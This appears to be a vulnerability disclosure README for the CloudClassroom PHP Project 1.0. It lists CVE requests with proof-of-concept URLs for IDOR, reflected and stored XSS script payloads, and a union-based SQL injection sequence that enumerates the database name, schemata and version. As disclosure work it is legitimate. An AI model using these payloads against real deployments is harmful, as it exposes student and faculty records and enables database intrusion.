# Cloud-ClassRooms-PHP-1.0-Poc3
___
- Software: CloudClassroom PHP Project
- Version: 1.0 (discontinued)
- Business Area: Education / e-Learning Platforms
- Vendor: https://github.com/mathurvishal/CloudClassroom-PHP-Project
___
# IDOR - Insecure Direct Object

## CVE Request 1928456:
- Presentation: IDOR (Insecure Direct Object)-  via GET eno parameter
- Security vulnerability: Insecure Direct Object
- Vulnerability Type: Broken Access Control
- Affected Component: updatedetailsfromstudent.php endpoint — GET parameter eno

Poc IDOR: 
- /updatedetailsfromstudent.php?eno=146891651#
- /updatedetailsfromstudent.php?eno=146891652#

<img width="1839" height="816" alt="image" src="https://github.com/user-attachments/assets/f6be2239-bacd-4bfc-9002-51b574cae2dc" />

<img width="1841" height="834" alt="image" src="https://github.com/user-attachments/assets/80639b42-cc71-4dec-8a40-f36dda1aa562" />

___
## CVE Request 1928469: 
- Presentation: IDOR (Insecure Direct Object)-  via GET myds parameter
- Security vulnerability: Insecure Direct Object
- Vulnerability Type: Broken Access Control
- Affected Component: mydetailsstudent.php endpoint — GET parameter myds

Poc IDOR: 
- /mydetailsstudent.php?myds=harsh@ics.com
- /mydetailsstudent.php?myds=rohan@ics.com
  
<img width="1840" height="840" alt="image" src="https://github.com/user-attachments/assets/fb71980f-b576-4b04-8782-d27a98fa24a8" />

<img width="1851" height="848" alt="image" src="https://github.com/user-attachments/assets/a2c57971-26bb-45f5-8ac7-2e8db356b48b" />


___

## CVE Request 1928465:
- Presentation: IDOR (Insecure Direct Object)-  via GET myfid parameter
- Security vulnerability: Insecure Direct Object
- Vulnerability Type: Broken Access Control
- Affected Component: mydetailsfaculty.php endpoint — GET parameter myfid
Poc IDOR:
- /mydetailsfaculty.php?myfid=102
- /mydetailsfaculty.php?myfid=101

<img width="1854" height="733" alt="image" src="https://github.com/user-attachments/assets/6707bed0-53c8-490c-b20e-5901f86462b4" />

<img width="1800" height="711" alt="image" src="https://github.com/user-attachments/assets/2d2b5f46-9b8c-4330-854e-bdfba9fa82af" />

___

## CVE Request 1928471:
- Presentation: IDOR (Insecure Direct Object)-  via GET myfid parameter
- Security vulnerability: Insecure Direct Object
- Vulnerability Type: Broken Access Control
- Affected Component: updatedetailsfromfaculty.php endpoint — GET parameter myfid
Poc IDOR:
- /updatedetailsfromfaculty.php?myfid=102
- /updatedetailsfromfaculty.php?myfid=101

<img width="1873" height="754" alt="image" src="https://github.com/user-attachments/assets/7b97ee4a-1954-49b4-b858-9b52962c80d3" />

<img width="979" height="705" alt="image" src="https://github.com/user-attachments/assets/7d8be9c6-59ee-424d-9f7f-6ed07c1b1e96" />

___

# XSS

## CVE Request 1928476:
- Presentation: XSS (Cross-Site Scripting)-  via GET eid parameter
- Security vulnerability: Cross-Site Scripting Reflect
- Vulnerability Type: Injection
- Affected Component: askquery.php endpoint — GET parameter eid

Poc XSS Reflect:
- /askquery.php?eid="><script>alert("Carlos%20Tuma%20-%20Bl4dsc4n")</script>

<img width="1038" height="732" alt="image" src="https://github.com/user-attachments/assets/3c33a43b-084e-4768-8b60-ca1d8712e129" />

<img width="1360" height="188" alt="image" src="https://github.com/user-attachments/assets/8a8b11d7-1b1a-4580-9ff0-31ebc3bdc7a4" />

___

## CVE Request 1928478:
- Presentation: XSS (Cross-Site Scripting)-  via GET exid parameter
- Security vulnerability: Cross-Site Scripting Reflect
- Vulnerability Type: Injection
- Affected Component: takeassessment2.php endpoint — GET parameter exid
  
Poc XSS Reflect:

- /takeassessment2.php?exid=6"><script>alert("Carlos%20Tuma%20-%20Bl4dsc4n")</script>

<img width="1848" height="620" alt="image" src="https://github.com/user-attachments/assets/e9d557d9-a296-48f7-9af3-7ddcab104956" />

<img width="1393" height="221" alt="image" src="https://github.com/user-attachments/assets/49e39a7d-e4d8-4297-ab41-9f2cc4c8641d" />

___

## CVE Request 1928485
- Presentation: XSS (Cross-Site Scripting)-  via GET exid parameter
- Security vulnerability: Cross-Site Scripting Storage
- Vulnerability Type: Injection
- Affected Component: updatedetailsfromstudent.php  endpoint — GET parameter eno - parameter Addres.
  
Poc XSS Storage:  
- /updatedetailsfromstudent.php?eno=146891650
- Addres: "><script>alert("Carlos%20Tuma%20-%20Bl4dsc4n")</script>

<img width="1831" height="847" alt="image" src="https://github.com/user-attachments/assets/acacc85d-9155-4046-a299-ac7dd0b8282e" />

<img width="1337" height="192" alt="image" src="https://github.com/user-attachments/assets/6ab18c68-70e1-4c0c-8d6e-7aa4c0964f2a" />

<img width="1333" height="230" alt="image" src="https://github.com/user-attachments/assets/71ac925f-44ba-42f7-868b-30ba888f6739" />

<img width="1849" height="1203" alt="image" src="https://github.com/user-attachments/assets/aecb003d-8bb0-44fa-bf99-19938947ab33" />


___
## CVE Request 1928493
- Presentation: XSS (Cross-Site Scripting)-  via GET exid parameter
- Security vulnerability: Cross-Site Scripting Storage
- Vulnerability Type: Injection
- Affected Component: updatedetailsfromfaculty.php  endpoint — GET parameter myfid - parameter Addres.

Poc XSS Storage:
- /updatedetailsfromfaculty.php?myfid=101
- Address : "><script>alert("Carlos%20Tuma%20-%20Bl4dsc4n")</script>

<img width="1996" height="915" alt="image" src="https://github.com/user-attachments/assets/c51afd63-0020-42b9-9a8e-e027538fa0b2" />

<img width="1373" height="240" alt="image" src="https://github.com/user-attachments/assets/18018db5-ae3f-40e3-b823-0cc02800c03a" />

<img width="1390" height="215" alt="image" src="https://github.com/user-attachments/assets/ff054ac0-aa98-474f-9b33-b90aefd80e9d" />

<img width="1867" height="867" alt="image" src="https://github.com/user-attachments/assets/0c5a819b-ee26-41b0-83f5-ed5da464616a" />

___

# SQL 

## CVE Request 1928480
- Presentation: SQLi (SQl Injection)-  via GET exid parameter
- Security vulnerability: Sql Injection Union Based
- Vulnerability Type: Injection
- Affected Component: takeassessment2.php endpoint — GET parameter exid


Poc SQLi:
- /takeassessment2.php?exid=6%27%20or%201=1--%20-
- /takeassessment2.php?exid=6%27%20ORDER%20BY%201--%20-
- /takeassessment2.php?exid=6%27%20ORDER%20BY%207--%20-
- /takeassessment2.php?exid=6%27%20UNION%20SELECT%20NULL,%20NULL,%20NULL,%20NULL,%20NULL,%20NULL,%20DATABASE()--%20-
- /takeassessment2.php?exid=1%27%20UNION%20SELECT%20NULL,%20NULL,%20NULL,%20NULL,%20schema_name,%20NULL,%20NULL%20FROM%20information_schema.schemata--%20-
- /takeassessment2.php?exid=1%27%20UNION%20SELECT%20NULL,%20NULL,%20NULL,%20NULL,%20NULL,%20NULL,%20VERSION()--%20-

<img width="1787" height="1401" alt="image" src="https://github.com/user-attachments/assets/51e3af4f-e717-4d1b-b058-0ff726592033" />

<img width="1937" height="1293" alt="image" src="https://github.com/user-attachments/assets/f721969e-e883-4356-a6c0-983607c99e19" />

<img width="1869" height="389" alt="image" src="https://github.com/user-attachments/assets/cd39afe5-a9a1-4495-ac71-d2586357f813" />

<img width="1629" height="1153" alt="image" src="https://github.com/user-attachments/assets/8291abdd-68b9-4f6d-80e6-a689f4022d80" />


